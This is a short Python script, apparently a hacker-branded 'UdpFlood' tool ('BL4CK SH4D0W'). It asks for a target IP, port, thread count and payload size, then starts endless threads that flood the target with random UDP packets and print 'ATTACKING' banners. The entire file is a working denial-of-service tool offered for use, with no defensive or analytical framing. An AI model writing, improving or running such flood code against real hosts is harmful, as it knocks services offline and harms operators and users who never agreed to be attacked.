#!/usr/bin/env python3
import os, sys, time, random, socket, threading

os.system('cls' if os.name == 'nt' else 'clear')
print("""\u001b[31mUdpFlood - Extrash\u001b[37m""")
ip = str(input(" Host/Ip? > "))
port = int(input(" Port? > "))
times = int(input(" Connections? > "))
threads = int(input(" Threads? > "))
urndm = int(input(" Urandom? (default 1024) > "))
time.sleep(1)

def attack():
	data = random._urandom(urndm)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f"\u001b[33m BL4CK SH4D0W ====> \u001b[31mATTACKING TO IP \u001b[37m{ip} \u001b[31mON PORT \u001b[37m{port}")
		except:
			print(f"\u001b[33m BL4CK SH4D0W ====> \u001b[31mATTACKING TO IP \u001b[37m{ip} \u001b[31mON PORT \u001b[37m{port}")

def attackx():
	data = random._urandom(615)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f"\u001b[33m BL4CK SH4D0W ====> \u001b[31mATTACKING TO IP \u001b[37m{ip} \u001b[31mON PORT \u001b[37m{port}")
		except:
			print(f"\u001b[33m BL4CK SH4D0W ====> \u001b[31mATTACKING TO IP \u001b[37m{ip} \u001b[31mON PORT \u001b[37m{port}")

def attackxx():
	data = random._urandom(1025)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f"\u001b[33m BL4CK SH4D0W ====> \u001b[31mATTACKING TO IP \u001b[37m{ip} \u001b[31mON PORT \u001b[37m{port}")
		except:
			print(f"\u001b[33m BL4CK SH4D0W ====> \u001b[31mATTACKING TO IP \u001b[37m{ip} \u001b[31mON PORT \u001b[37m{port}")

for _x in range(threads):
	threading.Thread(target=attack).start()
	threading.Thread(target=attackx).start()
	threading.Thread(target=attackxx).start()